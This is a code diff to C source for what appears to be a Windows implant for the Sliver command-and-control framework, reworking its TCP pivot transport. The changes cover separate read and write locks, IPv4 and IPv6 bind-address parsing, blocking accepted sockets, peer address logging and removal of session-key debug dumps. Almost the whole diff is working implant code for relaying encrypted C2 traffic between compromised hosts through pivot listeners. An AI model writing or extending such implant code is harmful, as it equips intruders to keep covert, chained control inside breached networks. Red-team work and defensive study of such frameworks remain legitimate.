@@ -17,11 +17,11 @@ BOOL SocketSend
 	pTemp = ALLOC(cbTemp);
 	memcpy(pTemp, &pBuffer->cbBuffer, sizeof(DWORD));
 	memcpy(pTemp + sizeof(DWORD), pBuffer->pBuffer, pBuffer->cbBuffer);
-	EnterCriticalSection(pSliverTcpClient->pLock);
-	if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_SNDTIMEO, &pSliverTcpClient->dwWriteDeadline, sizeof(pSliverTcpClient->dwWriteDeadline))) {
+	EnterCriticalSection(pSliverTcpClient->pWriteLock);
+	/*if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_SNDTIMEO, &pSliverTcpClient->dwWriteDeadline, sizeof(pSliverTcpClient->dwWriteDeadline))) {
 		LOG_ERROR("setsockopt", WSAGetLastError());
 		goto CLEANUP;
-	}
+	}*/
 
 	while (dwTotal < cbTemp) {
 		dwNumberOfBytesSent = send(pSliverTcpClient->Sock, &pTemp[dwTotal], cbTemp - dwTotal, 0);
@@ -35,12 +35,11 @@ BOOL SocketSend
 
 	Result = TRUE;
 CLEANUP:
-	if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_SNDTIMEO, &dwZeroTimeout, sizeof(dwZeroTimeout))) {
+	/*if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_SNDTIMEO, &dwZeroTimeout, sizeof(dwZeroTimeout))) {
 		LOG_ERROR("setsockopt", WSAGetLastError());
-		goto CLEANUP;
-	}
+	}*/
 
-	LeaveCriticalSection(pSliverTcpClient->pLock);
+	LeaveCriticalSection(pSliverTcpClient->pWriteLock);
 	FREE(pTemp);
 
 	return Result;
@@ -57,11 +56,11 @@ PBUFFER SocketRecv
 	DWORD dwZeroTimeout = 0;
 	BOOL IsOk = FALSE;
 
-	EnterCriticalSection(pSliverTcpClient->pLock);
-	if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_RCVTIMEO, &pSliverTcpClient->dwReadDeadline, sizeof(pSliverTcpClient->dwReadDeadline))) {
+	EnterCriticalSection(pSliverTcpClient->pReadLock);
+	/*if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_RCVTIMEO, &pSliverTcpClient->dwReadDeadline, sizeof(pSliverTcpClient->dwReadDeadline))) {
 		LOG_ERROR("setsockopt", WSAGetLastError());
 		goto CLEANUP;
-	}
+	}*/
 
 	Result = ALLOC(sizeof(BUFFER));
 	dwNumberOfBytesRecv = recv(pSliverTcpClient->Sock, &Result->cbBuffer, sizeof(Result->cbBuffer), 0);
@@ -83,12 +82,11 @@ PBUFFER SocketRecv
 
 	IsOk = TRUE;
 CLEANUP:
-	if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_RCVTIMEO, &dwZeroTimeout, sizeof(dwZeroTimeout))) {
+	/*if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_RCVTIMEO, &dwZeroTimeout, sizeof(dwZeroTimeout))) {
 		LOG_ERROR("setsockopt", WSAGetLastError());
-		goto CLEANUP;
-	}
+	}*/
 
-	LeaveCriticalSection(pSliverTcpClient->pLock);
+	LeaveCriticalSection(pSliverTcpClient->pReadLock);
 	if (!IsOk) {
 		FreeBuffer(Result);
 		Result = NULL;
@@ -100,21 +98,20 @@ CLEANUP:
 PSLIVER_TCP_CLIENT TcpInit()
 {
 	PSLIVER_TCP_CLIENT pResult = NULL;
-	CHAR szHost[] = "127.0.0.1";
-	DWORD dwPort = 9898;
+	CHAR szBindAddress[] = "127.0.0.1:9898";
 	DWORD dwReadDeadline = 10;
 	DWORD dwWriteDeadline = 10;
 	WSADATA WsaData;
 	int ErrorCode = 0;
 	BOOL Result = FALSE;
 	BOOL IsOk = FALSE;
+	ULONG uBlockingMode = 0;
 
 	pResult = ALLOC(sizeof(SLIVER_TCP_CLIENT));
-	pResult->lpHost = DuplicateStrA(szHost, 0);
+	pResult->lpBindAddress = DuplicateStrA(szBindAddress, 0);
 	pResult->dwReadDeadline = dwReadDeadline * 1000;
 	pResult->dwWriteDeadline = dwWriteDeadline * 1000;
 	pResult->Sock = INVALID_SOCKET;
-	pResult->dwPort = dwPort;
 
 	SecureZeroMemory(&WsaData, sizeof(WsaData));
 	if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
@@ -128,8 +125,15 @@ PSLIVER_TCP_CLIENT TcpInit()
 		goto CLEANUP;
 	}
 
-	pResult->pLock = ALLOC(sizeof(CRITICAL_SECTION));
-	InitializeCriticalSection(pResult->pLock);
+	if (ioctlsocket(pResult->Sock, FIONBIO, &uBlockingMode)) {
+		LOG_ERROR("ioctlsocket", WSAGetLastError());
+		goto CLEANUP;
+	}
+
+	pResult->pReadLock = ALLOC(sizeof(CRITICAL_SECTION));
+	pResult->pWriteLock = ALLOC(sizeof(CRITICAL_SECTION));
+	InitializeCriticalSection(pResult->pReadLock);
+	InitializeCriticalSection(pResult->pWriteLock);
 	IsOk = TRUE;
 CLEANUP:
 	if (!IsOk) {
@@ -160,10 +164,15 @@ BOOL TcpCleanup
 )
 {
 	if (pSliverTcpClient != NULL) {
-		FREE(pSliverTcpClient->lpHost);
-		if (pSliverTcpClient->pLock != NULL) {
-			DeleteCriticalSection(pSliverTcpClient->pLock);
-			FREE(pSliverTcpClient->pLock);
+		FREE(pSliverTcpClient->lpBindAddress);
+		if (pSliverTcpClient->pReadLock != NULL) {
+			DeleteCriticalSection(pSliverTcpClient->pReadLock);
+			FREE(pSliverTcpClient->pReadLock);
+		}
+
+		if (pSliverTcpClient->pWriteLock != NULL) {
+			DeleteCriticalSection(pSliverTcpClient->pWriteLock);
+			FREE(pSliverTcpClient->pWriteLock);
 		}
 
 		FREE(pSliverTcpClient);
@@ -180,7 +189,6 @@ BOOL TcpStart
 )
 {
 	BOOL Result = FALSE;
-	SOCKADDR_IN Addr;
 	DWORD dwErrorCode = SOCKET_ERROR;
 	PBUFFER pPivotHello = NULL;
 	PBUFFER pPeerPublicKeyRaw = NULL;
@@ -198,15 +206,51 @@ BOOL TcpStart
 	PPBElement ServerKeyExResp[2];
 	LPVOID* UnmarshaledData = NULL;
 	DWORD i = 0;
+	IN_ADDR InAddr;
+	IN6_ADDR In6Addr;
+	SOCKADDR_IN SockAddr;
+	SOCKADDR_IN6 SockAddr6;
+	ULONG uScopeId = 0;
+	NTSTATUS Status = STATUS_SUCCESS;
+	USHORT uPort = 0;
+	BOOL UseIpv4 = TRUE;
+	DWORD dwReturnedCode = NO_ERROR;
 
-	SecureZeroMemory(&Addr, sizeof(Addr));
 	SecureZeroMemory(PivotServerKeyExchange, sizeof(PivotServerKeyExchange));
 	SecureZeroMemory(ServerKeyExResp, sizeof(ServerKeyExResp));
-	inet_pton(AF_INET, pSliverTcpClient->lpHost, &Addr.sin_addr.s_addr);
-	Addr.sin_family = AF_INET;
-	Addr.sin_port = htons(pSliverTcpClient->dwPort);
+	SecureZeroMemory(&InAddr, sizeof(InAddr));
+	SecureZeroMemory(&In6Addr, sizeof(In6Addr));
+	SecureZeroMemory(&SockAddr, sizeof(SockAddr));
+	SecureZeroMemory(&SockAddr6, sizeof(SockAddr6));
+	Status = RtlIpv6StringToAddressExA(pSliverTcpClient->lpBindAddress, &In6Addr, &uScopeId, &uPort);
+	if (Status == STATUS_SUCCESS) {
+		memcpy(&SockAddr6.sin6_addr, &In6Addr, sizeof(In6Addr));
+		SockAddr6.sin6_port = uPort;
+		SockAddr6.sin6_family = AF_INET6;
+		SockAddr6.sin6_scope_id = uScopeId;
+		UseIpv4 = FALSE;
+	}
+	else {
+		Status = RtlIpv4StringToAddressExA(pSliverTcpClient->lpBindAddress, TRUE, &InAddr, &uPort);
+		if (Status == STATUS_SUCCESS) {
+			SockAddr.sin_addr.s_addr = InAddr.S_un.S_addr;
+			SockAddr.sin_port = uPort;
+			SockAddr.sin_family = AF_INET;
+		}
+		else {
+			LOG_ERROR("RtlIpv6StringToAddressExA", Status);
+			goto CLEANUP;
+		}
+	}
 
-	if (connect(pSliverTcpClient->Sock, &Addr, sizeof(Addr))) {
+	if (UseIpv4) {
+		dwReturnedCode = connect(pSliverTcpClient->Sock, &SockAddr, sizeof(SockAddr));
+	}
+	else {
+		dwReturnedCode = connect(pSliverTcpClient->Sock, &SockAddr6, sizeof(SockAddr6));
+	}
+
+	if (dwReturnedCode != NO_ERROR) {
 		LOG_ERROR("connect", WSAGetLastError());
 		goto CLEANUP;
 	}
@@ -232,12 +276,7 @@ BOOL TcpStart
 
 	// Server Key Exchange
 	pConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
-	PrintFormatA("pConfig->pSessionKey:\n");
-	HexDump(pConfig->pSessionKey, CHACHA20_KEY_SIZE);
-	PrintFormatA("pConfig->lpPeerPrivKey: %s\n", pConfig->lpPeerPrivKey);
 	pEncryptedSessionKey = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, pConfig->pSessionKey, CHACHA20_KEY_SIZE, &cbEncryptedSessionKey);
-	PrintFormatA("pEncryptedSessionKey:\n");
-	HexDump(pEncryptedSessionKey, cbEncryptedSessionKey);
 	PivotServerKeyExchange[0] = CreateVarIntElement(pConfig->uPeerID, 1);
 	PivotServerKeyExchange[1] = CreateBytesElement(pEncryptedSessionKey, cbEncryptedSessionKey, 2);
 	pPivotServerKeyExchangeData = CreateStructElement(PivotServerKeyExchange, _countof(PivotServerKeyExchange), 0);
@@ -326,7 +365,7 @@ PENVELOPE TcpRecv
 		goto CLEANUP;
 	}
 
-	pData = SliverDecrypt(pConfig->pSessionKey, pCipherText);
+	pData = SliverDecrypt(pConfig->pPeerSessionKey, pCipherText);
 	if (pData == NULL) {
 		goto CLEANUP;
 	}
@@ -357,7 +396,7 @@ PENVELOPE TcpRecv
 		goto CLEANUP;
 	}
 
-	pPlainText = SliverDecrypt(pConfig->pSessionKey, pPivotPeerEnvelope->pData, TRUE);
+	pPlainText = SliverDecrypt(pConfig->pSessionKey, pPivotPeerEnvelope->pData);
 	if (pPlainText == NULL) {
 		goto CLEANUP;
 	}
@@ -438,13 +477,22 @@ PPIVOT_CONNECTION TcpAccept
 )
 {
 	SOCKET Sock = INVALID_SOCKET;
-	SOCKET ClientSocket = INVALID_SOCKET;
+	SOCKET NewSock = INVALID_SOCKET;
 	PPIVOT_CONNECTION pResult = NULL;
 	PSLIVER_TCP_CLIENT pTcpClient = NULL;
+	ULONG uBlockingMode = 0;
+	SOCKADDR PeerAddr;
+	DWORD dwNameLength = sizeof(PeerAddr);
 
 	Sock = (SOCKET)pListener->ListenHandle;
-	ClientSocket = accept(Sock, NULL, NULL);
-	if (ClientSocket == INVALID_SOCKET) {
+	NewSock = accept(Sock, NULL, NULL);
+	if (NewSock == INVALID_SOCKET) {
+		LOG_ERROR("accept", WSAGetLastError());
+		goto CLEANUP;
+	}
+
+	if (ioctlsocket(NewSock, FIONBIO, &uBlockingMode)) {
+		LOG_ERROR("ioctlsocket", WSAGetLastError());
 		goto CLEANUP;
 	}
 
@@ -456,11 +504,18 @@ PPIVOT_CONNECTION TcpAccept
 	pResult->Sock = INVALID_SOCKET;
 	pResult->dwPort = dwPort;*/
 	pTcpClient = ALLOC(sizeof(SLIVER_TCP_CLIENT));
-	pTcpClient->dwReadDeadline = 10;
-	pTcpClient->dwWriteDeadline = 10;
-	pTcpClient->Sock = ClientSocket;
-	pTcpClient->pLock = ALLOC(sizeof(CRITICAL_SECTION));
-	InitializeCriticalSection(pTcpClient->pLock);
+	pTcpClient->dwReadDeadline = 10 * 1000;
+	pTcpClient->dwWriteDeadline = 10 * 1000;
+	pTcpClient->Sock = NewSock;
+	pTcpClient->pReadLock = ALLOC(sizeof(CRITICAL_SECTION));
+	pTcpClient->pWriteLock = ALLOC(sizeof(CRITICAL_SECTION));
+	InitializeCriticalSection(pTcpClient->pReadLock);
+	InitializeCriticalSection(pTcpClient->pWriteLock);
+	SecureZeroMemory(&PeerAddr, sizeof(PeerAddr));
+	if (getpeername(NewSock, &PeerAddr, &dwNameLength) == NO_ERROR) {
+		pResult->lpRemoteAddress = SocketAddressToStr(&PeerAddr);
+	}
+
 	pResult->lpDownstreamConn = pTcpClient;
 	pResult->pListener = pListener;
 CLEANUP:
@@ -484,10 +539,10 @@ PPIVOT_LISTENER CreateTCPPivotListener
 	ULONG uScopeId = 0;
 	USHORT uPort = 0;
 	SOCKET Sock = INVALID_SOCKET;
-	ULONG IoBlock = 0;
 	DWORD dwErrorCode = 0;
 	BOOL IsOk = FALSE;
 	WSADATA WsaData;
+	ULONG uBlockingMode = 0;
 
 	SecureZeroMemory(&WsaData, sizeof(WsaData));
 	if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
@@ -531,7 +586,7 @@ PPIVOT_LISTENER CreateTCPPivotListener
 		goto CLEANUP;
 	}
 
-	if (ioctlsocket(Sock, FIONBIO, &IoBlock) != NO_ERROR) {
+	if (ioctlsocket(Sock, FIONBIO, &uBlockingMode)) {
 		LOG_ERROR("ioctlsocket", WSAGetLastError());
 		goto CLEANUP;
 	}
@@ -561,13 +616,15 @@ PPIVOT_LISTENER CreateTCPPivotListener
 	pListener->dwListenerId = pConfig->dwListenerID++;
 	pListener->pConfig = pConfig;
 	pListener->lpUpstream = lpClient;
+	InitializeCriticalSection(&pListener->Lock);
 
 	pListener->RawSend = SocketSend;
 	pListener->RawRecv = SocketRecv;
 	pListener->Accept = TcpAccept;
 	pListener->Close = TcpClose;
 	pListener->Cleanup = TcpCleanup;
-	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ListenerMainLoop, (LPVOID)pListener, 0, NULL) == NULL) {
+	pListener->hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ListenerMainLoop, (LPVOID)pListener, 0, NULL);
+	if (pListener->hThread == NULL) {
 		LOG_ERROR("CreateThread", GetLastError());
 		goto CLEANUP;
 	}
